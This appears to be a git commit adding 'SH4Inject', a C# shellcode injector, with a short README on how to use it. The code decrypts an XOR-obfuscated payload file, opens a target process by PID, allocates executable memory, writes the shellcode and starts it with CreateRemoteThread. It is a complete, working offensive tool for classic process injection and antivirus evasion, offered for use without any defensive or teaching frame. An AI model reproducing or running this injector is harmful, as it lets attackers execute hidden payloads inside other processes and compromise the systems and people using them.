70fbca76714c873ae2e5224efc63a5c9270f8f7b
TSH4RKS <91956462+TSH4RKS@users.noreply.github.com>
2022-05-26 15:59:52 +0200

    commit

---
+++ README.md
@@ -0,0 +1,7 @@
+# SH4Inject
+Simple C# Shellcode Injector with XOR Decryption
+
+## How to Use?
+```
+SH4Inject.exe <Path to XOR'ed Payload File> <PID to Inject to>
+```
---
+++ SH4Inject/Program.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+namespace SH4Inject
+{
+    class Program
+    {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        public static byte[] XOR(byte[] payload, string key)
+        {
+            byte[] xor_string = new byte[payload.Length];
+            char[] xor_key = key.ToCharArray();
+            for (int i = 0; i < payload.Length; i++)
+            {
+                xor_string[i] = (byte)(payload[i] ^ xor_key[i % xor_key.Length]);
+            }
+            return xor_string;
+        }
+
+        static void Main(string[] args)
+        {
+            Console.WriteLine("The secret key: ");
+            String key = Console.ReadLine();
+            byte[] payload = File.ReadAllBytes(args[0]);
+            byte[] decrypted_payload = XOR(payload, key);
+
+            var hProcess = OpenProcess(0x001F0FFF, false, int.Parse(args[1]));
+            var alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decrypted_payload.Length, 0x1000 | 0x2000, 0x40);
+
+            WriteProcessMemory(hProcess, alloc, decrypted_payload, (uint)decrypted_payload.Length, out UIntPtr bytesWritten);
+            CreateRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
+        }
+    }
+}
